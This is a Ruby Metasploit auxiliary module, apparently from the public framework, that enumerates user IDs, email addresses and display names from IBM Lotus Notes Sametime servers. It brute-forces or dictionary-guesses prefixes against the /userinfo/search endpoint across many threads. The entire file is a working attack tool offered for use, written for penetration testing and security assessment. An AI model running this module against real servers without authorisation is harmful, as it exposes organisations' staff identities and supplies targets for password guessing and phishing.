##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'enumerable'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'IBM Lotus Notes Sametime User Enumeration',
      'Description'    => %q{
        This module extracts users using the IBM Lotus Notes Sametime web
        interface using either brute-force or dictionary based attack.
      },
      'Author'         =>
        [
          'kicks4kittens' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Dec 27 2013',
      'DefaultOptions' =>
        {
          'SSL' => true
        }
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [ true,  'The path to the userinfo script',
                '/userinfo/search']),
         OptEnum.new('CHARSET', [true, 'Charset to use for enumeration', 'alpha',
                ['alpha', 'alphanum', 'num'] ]),
        OptEnum.new('TYPE', [true, 'Specify UID or EMAIL', 'UID', ['UID', 'EMAIL'] ]),
        OptPath.new('DICT', [ false,  'Path to dictionary file to use', '']),
        OptInt.new('MAXDEPTH', [ true,  'Maximum depth to check during brute-force', 2]),
        OptBool.new('STREAMFINDINGS', [true, 'Stream new users as discovered', true])
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('TIMING', [ true,  'Set pause between requests', 0]),
        OptString.new('SpecialChars', [false, 'Specify special chars (e.g. -_+!@&$/\?)', '' ]),
        OptString.new('PREFIX', [ false,  'Defines set prefix for each guess (e.g. user)', '']),
        OptString.new('SUFFIX', [ false,  'Defines set post for each quess (e.g. _adm)', '']),
        OptInt.new('Threads', [ true,  'Number of test threads', 10])
      ], self.class)
  end

  def setup

    # setup the desired charset
    @charset = []
    # setup array to hold user data
    @user_data = []

    if datastore['DICT'].nil? or datastore['DICT'].empty?
      # populate charset - lowercase only as search is case insensitive
      case datastore['CHARSET']
      when "alpha"
        ("a".."z").each do | alpha | @charset.push(alpha) end
      when "num"
        ("0".."9").each do | num | @charset.push(num) end
      when "alphanum"
        ("a".."z").each do | alpha | @charset.push(alpha) end
        ("0".."9").each do | num | @charset.push(num) end
      end
      if datastore['SpecialChars']
        datastore['SpecialChars'].chars do | spec |
          @charset.push(Rex::Text.uri_encode(spec))
        end
      end
      print_status("Performing Brute-Force based attack on #{peer}")
      print_status("CHARSET: [#{@charset.join(",")}]")
    else
      print_status("Performing dictionary based attack (#{datastore['DICT']}) on #{peer}")
    end

    # setup path
    type = datastore['TYPE'].downcase
    uri = target_uri.path
    @reqpath = normalize_uri(uri + '?mode=' +  type + '&searchText=')

    if (datastore['DICT'].nil? or datastore['DICT'].empty?) and datastore['MAXDEPTH'] > 2
      # warn user on long runs
      print_status("Depth level #{datastore['MAXDEPTH']} selected... this may take some time!")
    end
    @depth_warning = true
    @tested = []
    @retries = []

  end

  def run

    print_status("Testing #{peer} for IBM Lotus Notes Sametime User Enumeration flaw")

    # test for expected response code on non-existant uid/email
    if datastore['TYPE'] == "UID"
      rval = Rex::Text.rand_text_alpha(32)
    else
      rval = Rex::Text.rand_text_alpha(32) +"@"+ Rex::Text.rand_text_alpha(16) + ".com"
    end
    res = send_request_cgi({
      'uri'     =>  normalize_uri(@reqpath + rval),
      'method'  => 'GET',
      'ctype'   => 'text/html'
    })

    begin
      if not res
        print_error("No response from server #{peer}")
        return
      elsif not res.code == 200
        print_error("Unexpected response from server (Response code: #{res.code})")
        return
      elsif not JSON.parse(res.body).blank?
        # empty JSON element
        print_error("Received invalid response from server #{peer}")
        return
      else
        print_good("Response received, continuing to enumeration phase")
      end
    rescue JSON::ParserError,
      print_error("Error parsing JSON: Invalid response from server #{peer}")
      return
    end

    # start test handler
    test_handler

    # ouput results
    output_results

  end

  def test_handler

    # create initial test queue and populate
    @test_queue = Queue.new
    if (datastore['DICT'].nil? or datastore['DICT'].empty?)
      @charset.each { |char| @test_queue.push(char) }
    else
      File.open(datastore['DICT']).each { |line| @test_queue.push(line.chomp) }
      print_status("Loaded #{@test_queue.length} values from dictionary")
    end

    print_status("Beginning tests using #{datastore['TYPE']} search method (#{datastore['Threads']} Threads)")
    test_length = 1 # initial test length set

    while(not @test_queue.empty?)
      t = []
      nt = datastore['Threads'].to_i
      nt = 1 if nt == 0

      if @test_queue.length < nt
        # work around issue where threads not created as the queue isn't large enough
        nt = @test_queue.length
      end

      begin
        1.upto(nt) do
          t << framework.threads.spawn("Module(#{self.refname})-#{rhost}", false, @test_queue.shift) do |test_current|
            Thread.current.kill if not test_current

            # provide feedback to user on current test length
            if (datastore['DICT'].nil? or datastore['DICT'].empty?) and test_current.length > test_length
              test_length = test_current.length
              print_status("Beginning brute_force test for #{test_length} character strings")
            end

            res = make_request(test_current)

            # check response to see if an error was returned, if so wait 1 second and retry
            if not res and not @retries.include?(test_current)
              # attempt test again as the server was too busy to respond
              # correctly - error returned
              print_error("Error reading JSON response, attempting to redo check for \"#{test_current}\"")
              Rex::sleep(1) # sleep 1 second and retry request
              @retries << test_current
              res = make_request(test_current)
            end

            if res
              # check response for user data
              check_response(res, test_current)
            elsif not @retries.include?(test_current)
              vprint_error("No response received from server when testing string \"#{test_current}*\" (Retrying)")
              @retries << test_current
              Rex::sleep(1) # sleep 1 second and retry
              res = make_request(test_current)
            end

            if @retries.length == 10
              print_error("Excessive number of retries detected (#{@retries.length} check TIMING)")
              @retries << "warning sent to user" # increase length to avoid multiple warnings
            end
          end
        end
      t.each {|x| x.join }

      rescue ::Timeout::Error
      ensure
        t.each {|x| x.kill rescue nil }
      end
    end
  end

  def make_request(test_current)

    # make request and return response

    # combine test string with PRE and POST variables
    tstring = datastore['PREFIX'] + test_current + datastore['SUFFIX'] + "*"
    # Apply timing information to pause between making requests - not a timeout
    if datastore['TIMING'] > 0
      Rex::sleep(datastore['TIMING'])
    end

    res = send_request_cgi({
      'uri'     =>  normalize_uri(@reqpath + tstring),
      'method'  => 'GET',
      'ctype'   => 'text/html'
    })

  end

  def check_response(res, test_current)

    # check the response for valid user information

    begin
      # check response exists AND that it validates as JSON before proceeding
      if res.code.to_i == 200 and not JSON.parse(res.body).blank?
        # successful response - extract user data
        extract_user(res)
        # extend test_queue to search for further data (not if dictionary in use)
        extend_queue(test_current) if (datastore['DICT'].nil? or datastore['DICT'].empty?)
        return true
      elsif JSON.parse(res.body).blank? # empty JSON element
        # expected failure for non-existent user - must return false
        return false
      else
        # unexpected failure
        print_error("Unexpected response received from server #{peer}")
      end
    rescue JSON::ParserError
      # non-JSON response - server may be overloaded
      return error
    end
  end

  def extract_user(res)

    # extract user data if not already present
    begin
      userinfo = JSON.parse(res.body)
      if not @user_data.flatten.include?(userinfo['uid'])
        @user_data << [ userinfo['uid'], userinfo['mail'] || "-", userinfo['externalName'] || "-" ]
        if datastore['STREAMFINDINGS']
          # print newly discovered users straight to the screen
          print_good("New user found: #{userinfo['uid']}")
        end
        report_user(userinfo['uid'])
      end
    rescue JSON::ParserError
      print_error("Error reading JSON string, continuing")
    end

  end

  def extend_queue(test_current)

    # extend the test queue if MAXDEPTH value not exceeded
    # checks made to ensure duplicates are not created when extending

    # process:
    #
    # when a user is found searching for 'a' the queue for 'a' is extended as
    # only the first user starting with 'a' will be returned (e.g. 'aanderson')
    # To find all users the queue must be extended by adding 'aa' through to 'az'
    # Due to the threaded nature of this module, checks need to be in place to ensure
    # duplicate entries are not added to the queue by competing threads.

    if test_current.length < datastore['MAXDEPTH']
      @charset.each do | char |
        if not @tested.include?(test_current + char)
          # only add if not alread in queue - avoid duplicates appearing
          @test_queue.push(test_current + char)
          # keep track of whats already been queued and checked
          @tested.push(test_current + char)
        end
      end
    elsif @depth_warning and test_current.length == datastore['MAXDEPTH'] and not datastore['MAXDEPTH'] == 1
      vprint_status("Depth limit reached [#{datastore['MAXDEPTH']} levels deep] finishing up current tests")
      @depth_warning = false
      return
    end

  end

  def report_user(username)
    report_note(
      :host => rhost,
      :proto => 'tcp',
      :sname => 'sametime',
      :port => rport,
      :type => 'ibm_lotus_sametime_user',
      :data => "#{username}",
      :update => :unique_data
    )
  end

  def output_results
    # print output table

    user_tbl = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
      'Header'  => "IBM Lotus Sametime Users",
      'Prefix'  => "\n",
      'Indent'  => 1,
      'Columns'   =>
      [
        "UID",
        "Email",
        "CommonName"
      ])

    # populate tables
    @user_data.each do | line |
      user_tbl << [ line[0], line[1], line[2] ]
    end

    if not user_tbl.to_s.empty?
      print_good("#{@user_data.length} users extracted from #{peer}")
      print_line(user_tbl.to_s)
    else
      print_error("No users discovered")
    end
  end
end
